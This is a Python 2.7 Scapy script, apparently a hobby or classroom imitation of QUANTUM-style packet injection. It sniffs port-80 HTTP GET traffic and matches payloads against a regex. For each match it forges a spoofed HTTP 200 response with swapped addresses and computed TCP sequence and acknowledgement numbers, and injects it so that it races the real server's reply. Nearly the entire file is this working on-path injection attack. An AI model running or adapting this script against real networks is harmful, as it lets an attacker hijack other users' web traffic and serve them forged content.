# python 2.7
# how to run: python quantum.py --interface eth0 --regexp /^regex$/ --datafile someFIle expr
# python quantum.py --interface en0 --regexp chewbacca --datafile "<html><head><title> an example </title> </head><body> Hello World, </body></html>" pol
import argparse
from scapy.all import *
import re
from time import *

parser = argparse.ArgumentParser(description='idk')
parser.add_argument("--interface", help="interface")
parser.add_argument("--regexp", help="regular expression")
parser.add_argument("--datafile", help="datafile input")
parser.add_argument("expression", help="straight up input")

args = parser.parse_args()
# print args
# print args.interface
# print args.regexp
# print args.datafile
# print args.expression

stars = lambda n: "*" * n

def GET_print(packet):
    return "\n".join((
        stars(40) + "GET PACKET" + stars(40),
        packet.sprintf("{Raw:%Raw.load%}"),
        stars(90)))

# callback, called for each sniffed packet
# Determine whether we should allow it or not.
def determine_bad_packet(packet):
    print packet[IP].src, packet[IP].dst
    # compile the given regex for use
    regex = re.compile(args.regexp)
    # If the regex has any matches in the tcp
    # payload, we should inject a packet!
    try:
        packet[TCP][Raw]
    except IndexError:
        return
    else:
        if re.search(regex, packet[TCP][Raw].load):
            print 'matched'
            print GET_print(packet)
            print packet[TCP][Raw].load
            inject_packet(packet)

# Given a flagged packet, injects a packet
def inject_packet (flagged_packet):
    #to_inject = flagged_packet
    #print "flagged " + flagged_packet.summary()
    #http_headers = "HTTP / 1.1 400 Bad Request\r\nDate: Sun, 18 Oct 2012 10:36:20 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Length: 230\r\nContent-Type: text/html; charset=iso-8859-1\r\n\Connection: Closed\r\n\r\n"
    #http_content="<html><head><title>400 Bad Request</title></head><body><h1>Bad Request</h1><p>Your browser sent a request that this server could not understand.</p><p>The request line contained invalid characters following the protocol string.</p></body></html>"
    time = strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
    header_template = "HTTP/1.1 200 OK\r\nDate: " + time + "\r\nServer: Apache\r\nCache-Control: public, max-age=300\r\nConnection: close\r\nContent-type: text/html\r\n\r\n"

    content_template = "<html><title>Hi!</title><body><div><h1>YOYOYOYOYOYOYOYOY</h1></div></body></html>"

    http_reponse = header_template + content_template

    #http_headers = 'GET / HTTP/1.1\r\nHost: www.sex.com\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, sdch\r\nAccept-Language: en-US,en;q=0.8\r\n\r\n'
    to_inject = Ether()/IP()/TCP()/http_reponse #args.datafile
    #Ether fields
    to_inject[Ether].src = flagged_packet[Ether].dst
    to_inject[Ether].dst = flagged_packet[Ether].src
    # IP fields
    to_inject[IP].src = flagged_packet[IP].dst #"192.168.1.1"
    to_inject[IP].dst = flagged_packet[IP].src
    to_inject[IP].id = flagged_packet[IP].id + 112
    # TCP fields
    print 'tcp old packet sequence number: '
    print flagged_packet[TCP].seq
    print 'tcp new packet sequence number'
    print len(flagged_packet[Raw])
    print 'plus '
    print flagged_packet[TCP].seq
    print 'equals'
    print len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].sport = flagged_packet[TCP].dport
    to_inject[TCP].dport = flagged_packet[TCP].sport
    to_inject[TCP].ack = len(flagged_packet[Raw]) + flagged_packet[TCP].seq
    to_inject[TCP].seq = flagged_packet[TCP].ack

    to_inject[TCP].flags = "PA"
    del to_inject.chksum
    to_inject = to_inject.__class__(str(to_inject))
    sendp(to_inject)

# sniff the given interface for tcp packets
packets = sniff(iface=args.interface, filter="tcp and port 80", lfilter=lambda p: "GET" in str(p),
    prn=determine_bad_packet)

# must check each packet individually
# for packet in  packets:
#     # re.match vs re.search?
#     # packet must be a string, so this may not work
#     # See if the packet matches the given regex
#     if(re.search(regex, packet)):
#         print packet
